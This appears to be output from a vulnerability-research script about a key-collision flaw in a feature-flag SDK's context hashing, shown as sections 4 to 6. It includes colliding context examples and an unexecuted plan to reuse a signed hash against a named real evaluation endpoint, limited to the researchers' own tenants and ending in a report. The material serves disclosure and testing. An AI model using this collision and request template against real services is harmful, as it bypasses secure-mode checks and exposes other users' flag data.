## 4. Cross-implementation agreement
  disagreements: 0 / 5880
  (agreement means this is a shared SPEC-level flaw, not one SDK typo: the same collision
   exists in every SDK that follows the canonicalKey spec, and therefore on the server,
   which must compute the same value to verify the `h` parameter.)

## 5. Secondary asymmetry — KIND names are never encoded
C = {"kind":"a:b:c","key":"d"}
D = {"kind":"multi","a":{"key":"b"},"c":{"key":"d"}}
  node-server-sdk: canonicalKey(C)="a:b:c:d"  canonicalKey(D)="a:b:c:d"
  COLLISION: true
  (exploitable only if the service accepts context kinds containing ":" — context-kind
   naming rules are enforced server-side, so this vector needs live confirmation; the
   user-key vector in §1 needs no unusual kind names at all.)

## 6. Live confirmation plan (not executed by this script)
  Requires an environment with secure mode ON and a backend that signs a context key the
  attacker can influence (username, tenant slug, device id, session id, etc.):
   1. backend signs A = {kind:"user", key:"org:<victimOrg>:user:<victimUser>"}  → h
   2. attacker calls the client-side eval route with B = {kind:"multi",
      org:{key:"<victimOrg>"}, user:{key:"<victimUser>"}} and h from step 1:
        GET https://app.launchdarkly.com/sdk/evalx/{clientSideId}/contexts/{b64url(B)}?h={h}&withReasons=true
   3. expected (secure): 4xx invalid hash.  observed if vulnerable: 200 + B's flag values,
      i.e. the victim multi-context was evaluated using a hash issued for a different context.
  Only our own tenants/environments are used; stop at proof and report.
